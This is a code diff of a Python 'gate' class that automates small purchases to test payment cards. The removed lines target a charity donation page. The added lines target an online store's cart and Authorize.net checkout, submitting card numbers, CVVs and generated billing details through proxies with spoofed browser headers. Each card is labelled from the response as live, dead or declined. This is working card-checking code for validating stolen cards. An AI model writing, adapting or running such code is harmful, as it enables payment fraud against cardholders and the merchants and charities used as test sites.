@@ -8,6 +8,7 @@ from random import randint
 from dependencie.infobill import infobill
 
 from model.models import gateData
+from requests_toolbelt.multipart.encoder import MultipartEncoder
 
 class CoreGateCode:
     def __init__(self, cardID):
@@ -20,13 +21,13 @@ class CoreGateCode:
         return strx2[0]
     def __valiDCardId(self):
         if self.cardID == 'visa':
-            self.cardIDx2 = 'visa'
+            self.cardIDx2 = 'authnet:Visa'
         elif self.cardID == 'mc':
-            self.cardIDx2 = 'master'
+            self.cardIDx2 = 'authnet:MasterCard'
         elif self.cardID == 'amex':
-            self.cardIDx2 = 'american_express'
+            self.cardIDx2 = 'authnet:AmerExp'
         elif self.cardID == 'discovery':
-            self.cardIDx2 = 'discover'
+            self.cardIDx2 = 'authnet:Discover'
 
     def processCodeGate(self,cc,dataGate:gateData):
         self.__valiDCardId()
@@ -60,10 +61,12 @@ class CoreGateCode:
             status = dict()
 
 
+#x xxxx
 
-            url="https://hswcmd.networkforgood.com/projects/58997-help-hswc"
+
+            url="https://wingstuff.com/products/33153-universal-microphone-windsocks-large-or-small"
             headers={
-
+            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
             "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
             "Accept-Language":"en-US,en;q=0.5",
             "Accept-Encoding":"gzip, deflate, br",
@@ -77,46 +80,79 @@ class CoreGateCode:
             }
             datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)
 
-            authx = self.getStr(datac.text, 'name="csrf-token" content="', '"')
 
 
 
-            url="https://hswcmd.networkforgood.com/projects/58997-help-hswc/donations?ui=bootstrap4"
+            mp_encoder = MultipartEncoder(
+                {
+                    "Old_Screen":'PROD',
+                    "Old_Search":"",
+                    "Action":"ADPR",
+                    "Product_Code":"PG33153",
+                    "Category_Code":'headset_accessories',
+                    "Offset":"",
+                    "AllOffset":"",
+                    "CatListingOffset":"",
+                    "RelatedOffset":"0",
+                    "SearchOffset":"",
+                    "show":"",
+                    "Product_Attributes[1]:code":"choose_size",
+                    "Product_Attributes[1]:value":"small",
+                    "Product_Attribute_Count":"1",
+                    "Waitlist_Email":"",
+                    "Quantity":"1"
+                }
+            )
+
+
+
+
+
+            url="https://wingstuff.com/cart?ajax=1"
             headers={
 
-            "Accept":"*/*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript",
+            "Accept":"*/*",
             "Accept-Language":"en-US,en;q=0.5",
-            "Accept-Encoding":"gzip, deflate, br",
-            "Referer":"https://hswcmd.networkforgood.com/projects/58997-help-hswc",
-            "X-CSRF-Token":authx,
-            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
-            "X-Requested-With":"XMLHttpRequest",
-            "Origin":"https://hswcmd.networkforgood.com",
+
+            "Content-Type":mp_encoder.content_type,
+            "Origin":"https://wingstuff.com",
             "DNT":"1",
             "Connection":"keep-alive",
+            "Referer":"https://wingstuff.com/products/33153-universal-microphone-windsocks-large-or-small",
             "Sec-Fetch-Dest":"empty",
             "Sec-Fetch-Mode":"cors",
             "Sec-Fetch-Site":"same-origin",
             'TE':'trailers'
             }
-            data='utf8=%E2%9C%93&donation_form%5Bstep%5D=3&donation_form%5Btargetable_type%5D=Project&donation_form%5Btargetable_id%5D=58997&donation%5Bdonation_amount%5D=-1&donation%5Bdonation_amount_custom_amount%5D=6&donation%5Bdesignation_id%5D=14625&donation%5Bnote%5D=&donation%5Bpublish_my_donation_amount%5D=0&donation%5Bpublish_my_name%5D=0&donation%5Bhonor_or_memorialize%5D=No&donation%5Bdonor_id%5D=6077300&recurring_donation%5Bperiod%5D=one_time&recurring_donation%5Bend_date%5D=&tribute%5Bname%5D=&tribute%5Brelationship%5D=&tribute%5Bnotify%5D=false&tribute%5Bnote%5D=&person%5Bfirst_name%5D=&person%5Blast_name%5D=&person%5Bstreet_address%5D=&person%5Bstreet_address2%5D=&person%5Bcity%5D=&person%5Bstate%5D=&person%5Bzip_code%5D=&person%5Bcountry%5D=US&person%5Bemail%5D=&person%5Bphone%5D=&donation_form%5Bquestionnaire_response%5D%5Bquestionnaire_id%5D=9127&donation_form%5Bquestionnaire_response%5D%5Banswers%5D%5Bq_39342%5D%5B%5D='
-            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)
+            datac=cs.post(url=url,headers=headers,data=mp_encoder,proxies=proxies,timeout=timeout)
 
 
-
-
-
-
-
-            url="https://hswcmd.networkforgood.com/orders/new"
+            url="https://wingstuff.com/cart?do_checkout=1"
             headers={
-
+            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
             "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
             "Accept-Language":"en-US,en;q=0.5",
-            "Accept-Encoding":"gzip, deflate, br",
-            "Referer":"https://hswcmd.networkforgood.com/projects/58997-help-hswc",
             "DNT":"1",
             "Connection":"keep-alive",
+            "Referer":"https://wingstuff.com/products/33153-universal-microphone-windsocks-large-or-small",
+            "Upgrade-Insecure-Requests":"1",
+            "Sec-Fetch-Dest":"document",
+            "Sec-Fetch-Mode":"navigate",
+            "Sec-Fetch-Site":"same-origin",
+            'Sec-Fetch-User':'?1'
+            }
+            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)
+
+
+
+            url="https://wingstuff.com/checkout.html?nc=1650959791"
+            headers={
+            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
+            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language":"en-US,en;q=0.5",
+            "DNT":"1",
+            "Connection":"keep-alive",
+            "Referer":"https://wingstuff.com/cart?do_checkout=1",
             "Upgrade-Insecure-Requests":"1",
             "Sec-Fetch-Dest":"document",
             "Sec-Fetch-Mode":"navigate",
@@ -127,50 +163,15 @@ class CoreGateCode:
             datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)
 
 
-
-
-
-
-
-            authx = self.getStr(datac.text, 'name="csrf-token" content="', '"')
-
-            emailsxa = self.billx.emailx
-
-
-
-            url="https://hswcmd.networkforgood.com/donors/unique"
+            url="https://wingstuff.com/checkout-customer-information.html"
             headers={
-
-            "Accept":"*/*",
-            "Accept-Language":"en-US,en;q=0.5",
-            "Accept-Encoding":"gzip, deflate, br",
-            "Referer":"https://hswcmd.networkforgood.com/orders/login_or_new",
-            "X-CSRF-Token":authx,
-            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
-            "X-Requested-With":"XMLHttpRequest",
-            "Origin":"https://hswcmd.networkforgood.com",
-            "DNT":"1",
-            "Connection":"keep-alive",
-            "Sec-Fetch-Dest":"empty",
-            "Sec-Fetch-Mode":"cors",
-            "Sec-Fetch-Site":"same-origin",
-            'TE':'trailers'
-            }
-            data='email='+emailsxa+'%40hotmail.com&type=Individual'
-            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)
-
-
-            url="https://hswcmd.networkforgood.com/donors?livestream_event=false"
-            headers={
-
+            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
             "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
             "Accept-Language":"en-US,en;q=0.5",
-            "Accept-Encoding":"gzip, deflate, br",
-            "Referer":"https://hswcmd.networkforgood.com/orders/login_or_new",
-            "Content-Type":"application/x-www-form-urlencoded",
-            "Origin":"https://hswcmd.networkforgood.com",
+
             "DNT":"1",
             "Connection":"keep-alive",
+            "Referer":"https://wingstuff.com/checkout.html?nc=1650959791",
             "Upgrade-Insecure-Requests":"1",
             "Sec-Fetch-Dest":"document",
             "Sec-Fetch-Mode":"navigate",
@@ -178,50 +179,22 @@ class CoreGateCode:
             "Sec-Fetch-User":"?1",
             'TE':'trailers'
             }
-            data='utf8=%E2%9C%93&authenticity_token='+quote(authx,safe="")+'&donor%5Bfundraiser%5D=false&donor%5Banonymous%5D=true&donor%5Btype%5D=Individual&donor%5Bfirst_name%5D='+self.billx.nameFirs+'&donor%5Blast_name%5D='+self.billx.nameLast+'&donor%5Bemail%5D='+emailsxa+'%40hotmail.com'
-            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)
-
-            authx = self.getStr(datac.text, 'name="csrf-token" content="', '"')
-            sleep(2)
+            datac=cs.get(url=url,headers=headers,proxies=proxies,timeout=timeout)
 
 
-            url="https://core.spreedly.com/v1/payment_methods/restricted.json?from=iframe&v=1.75"
+            emailxas = self.billx.emailx
+
+            url="https://wingstuff.com/checkout-special-offers.html"
             headers={
-
-            "Accept":"*/*",
-            "Accept-Language":"en-US,en;q=0.5",
-            "Accept-Encoding":"gzip, deflate, br",
-            "CONTENT-TYPE":"application/json",
-            "Spreedly-Environment-Key":"2tI9DNTiP5mcix58k3VMV33UrI",
-            "Origin":"https://core.spreedly.com",
-            "DNT":"1",
-            "Connection":"keep-alive",
-            "Referer":"https://core.spreedly.com/v1/embedded/number-frame-1.75.html",
-            "Sec-Fetch-Dest":"empty",
-            "Sec-Fetch-Mode":"cors",
-            "Sec-Fetch-Site":"same-origin",
-            'TE':'trailers'
-            }
-            data='{"environment_key":"2tI9DNTiP5mcix58k3VMV33UrI","payment_method":{"credit_card":{"number":"'+cc.ccnum+'","verification_value":"'+cc.cv2+'","first_name":"'+self.billx.nameFirs+'","last_name":"'+self.billx.nameLast+'","full_name":"'+self.billx.nameFirs+' '+self.billx.nameLast+'","email":"'+emailsxa+'@hotmail.com","month":"'+cc.expm+'","year":"'+cc.expy+'","address1":"'+self.billx.address+'","city":"'+self.billx.city+'","state":"'+self.billx.estado2+'","zip":"'+self.billx.zipcode+'","country":"US"}}}'
-            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)
-
-
-
-            tok = datac.json()['transaction']['payment_method']['token']
-
-
-
-            url="https://hswcmd.networkforgood.com/orders"
-            headers={
-
+            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
             "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
             "Accept-Language":"en-US,en;q=0.5",
-            "Accept-Encoding":"gzip, deflate, br",
-            "Referer":"https://hswcmd.networkforgood.com/orders/new",
+
             "Content-Type":"application/x-www-form-urlencoded",
-            "Origin":"https://hswcmd.networkforgood.com",
+            "Origin":"https://wingstuff.com",
             "DNT":"1",
             "Connection":"keep-alive",
+            "Referer":"https://wingstuff.com/checkout-customer-information.html",
             "Upgrade-Insecure-Requests":"1",
             "Sec-Fetch-Dest":"document",
             "Sec-Fetch-Mode":"navigate",
@@ -229,19 +202,71 @@ class CoreGateCode:
             "Sec-Fetch-User":"?1",
             'TE':'trailers'
             }
-            data='utf8=%E2%9C%93&authenticity_token='+quote(authx,safe="")+'&live_stream=false&donor%5Bemail%5D='+emailsxa+'%40hotmail.com&credit_card%5Bname%5D='+self.billx.nameFirs+'+'+self.billx.nameLast+'&credit_card%5Bmonth%5D='+cc.expm+'&credit_card%5Byear%5D='+cc.expy+'&payment_profile%5Bpayment_method_token%5D='+tok+'&payment_profile%5Bgateway_customer_id%5D=dadae8064296cf664455fc48620c8ffe141f&payment_profile%5Bname_on_card%5D='+self.billx.nameFirs+'+'+self.billx.nameLast+'&payment_profile%5Blast_four_digits%5D='+cc2+'&payment_profile%5Bcard_type%5D='+self.cardIDx2+'&payment_profile%5Bmonth%5D='+cc.expm+'&payment_profile%5Byear%5D='+cc.expy+'&donor_email_address='+emailsxa+'%40hotmail.com&address%5Bstreet_address%5D='+self.billx.address+'&address%5Bstreet_address2%5D=&address%5Bcity%5D='+self.billx.city+'&address%5Bstate%5D='+self.billx.estado2+'&address%5Bzip_code%5D='+self.billx.zipcode+'&address%5Bcountry%5D=US&donor%5Bphone_number%5D='+self.billx.phone1+'&donor%5Bphone_number_type%5D=cell&order%5Bcbx_terms_and_conditions%5D=1&order%5Badd_or_deduct_fee%5D=add&order%5Btotal_add_fee%5D=0.18&order%5Btotal_deduct_fee%5D=0.0&order%5Badd_or_deduct_fee_percentage%5D=0.03&order%5Brisk_token%5D=%7B%22device_session_id%22%3A%22184cbb9b0f6d0fb55b9314c946327277%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2254dfef6034be9b8df2da83378ea9fa3f%22%7D'
+            data='Action=ORDR&shipping_to_show=1&ShipFirstName='+self.billx.nameFirs+'&ShipLastName='+self.billx.nameLast+'&ShipCompany=&ShipEmail='+emailxas+'%40gmail.com&ShipPhone='+self.billx.phone1+'&ShipAddress1='+self.billx.address+'&ShipAddress2=&ShipCity='+self.billx.city+'&ShipStateSelect='+self.billx.estado2+'&ShipState=&ShipCountry=US&ShipZip='+self.billx.zipcode+'&billing_to_show=1&BillFirstName='+self.billx.nameFirs+'&BillLastName='+self.billx.nameLast+'&BillCompany=&BillEmail='+emailxas+'%40gmail.com&BillPhone='+self.billx.phone1+'&BillAddress1='+self.billx.address+'&BillAddress2=&BillCity='+self.billx.city+'&BillStateSelect='+self.billx.estado2+'&BillState=&BillCountry=US&BillZip='+self.billx.zipcode
             datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)
 
 
-   
-            if 'Thank you for supporting our organization!' in datac.text:
-                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: APPROVED""",'proxy':dataGate.proxy,'datext':None}
-            elif 'Check the card details carefully and try again, or use a different card' in datac.text:
-                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse':f"""{dataGate.cc} |- RESULT: REJECTED""",'proxy':dataGate.proxy,'datext':None}
+            shipmet = self.getStr(datac.text,'name="ShippingMethod" value="','"')
+
+            url="https://wingstuff.com/checkout-payment-information.html"
+            headers={
+            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
+            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language":"en-US,en;q=0.5",
+            "Content-Type":"application/x-www-form-urlencoded",
+            "Origin":"https://wingstuff.com",
+            "DNT":"1",
+            "Connection":"keep-alive",
+            "Referer":"https://wingstuff.com/checkout-special-offers.html",
+            "Upgrade-Insecure-Requests":"1",
+            "Sec-Fetch-Dest":"document",
+            "Sec-Fetch-Mode":"navigate",
+            "Sec-Fetch-Site":"same-origin",
+            "Sec-Fetch-User":"?1",
+            'TE':'trailers'
+            }
+            data='Action=SHIP%2CPSHP%2CCTAX&ShippingMethod='+shipmet+'&PaymentMethod=authnet%3AVisa'
+            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)
+
+
+            payTok = self.getStr(datac.text,'PaymentAuthorizationToken" value="','"')
+
+            url="https://wingstuff.com/mm5/merchant.mvc?"
+            headers={
+            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0",
+            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language":"en-US,en;q=0.5",
+
+            "Content-Type":"application/x-www-form-urlencoded",
+            "Origin":"https://wingstuff.com",
+            "DNT":"1",
+            "Connection":"keep-alive",
+            "Referer":"https://wingstuff.com/checkout-payment-information.html",
+            "Upgrade-Insecure-Requests":"1",
+            "Sec-Fetch-Dest":"document",
+            "Sec-Fetch-Mode":"navigate",
+            "Sec-Fetch-Site":"same-origin",
+            "Sec-Fetch-User":"?1",
+            'TE':'trailers'
+            }
+            data='Action=AUTH&Screen=INVC&Store_Code=wings&AuthorizeNet_Method_Type=CC&PaymentAuthorizationToken='+payTok+'&PaymentMethod='+self.cardIDx2+'&SplitPaymentData=&AuthorizeNet_First_Name='+self.billx.nameFirs+'&AuthorizeNet_Last_Name='+self.billx.nameLast+'&AuthorizeNet_Card_Num='+cc.ccnum+'&AuthorizeNet_CardExp_Month='+cc.expm+'&AuthorizeNet_CardExp_Year='+cc.expy+'&AuthorizeNet_Cvv='+cc.cv2+'&question1=&question2=&question3=Billing+and+Shipping+addresses+match%21&maxquestions=3'
+            datac=cs.post(url=url,headers=headers,data=data,proxies=proxies,timeout=timeout)
+
+
+            if 'Unable to authorize payment.' in datac.text:
+                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+"[CARD DECLINADA]",'proxy':dataGate.proxy,'datext':None}
+            elif "This transaction has been declined" in datac.text:
+                status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+"[CARD DIE]",'proxy':dataGate.proxy,'datext':None}
+            # elif "CVV2 Mismatch: 15004-This transaction cannot be processed." in datac.text:
+            #     status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+"[CARD DIE]",'proxy':dataGate.proxy,'datext':None}
+            # elif "Your credit card payment has been declined due to incorrect card details or insufficient funds on the card." in datac.text:
+            #     status = {'msg':1,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+"[CARD DIE]",'proxy':dataGate.proxy,'datext':None}
+            elif "Thank you" in datac.text:
+                status = {'msg':2,'contentCC': dataGate.cc,'ccResponse': dataGate.cc+" [LIVE SUCCESS]",'proxy':dataGate.proxy,'datext':None}
             else:
-                status = {'msg':3,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy,'datext':None}
-
+                status = {'msg':3,'contentCC':dataGate.cc,'ccResponse': " CC =====>"+dataGate.cc,'proxy':dataGate.proxy,'datext':None}
+                
             return status
         except Exception as e:
-            print(e,'que pasox')
+            print(e,'que paso')
             return {'msg':4,'contentCC':dataGate.cc,'ccResponse': dataGate.cc,'proxy':dataGate.proxy}
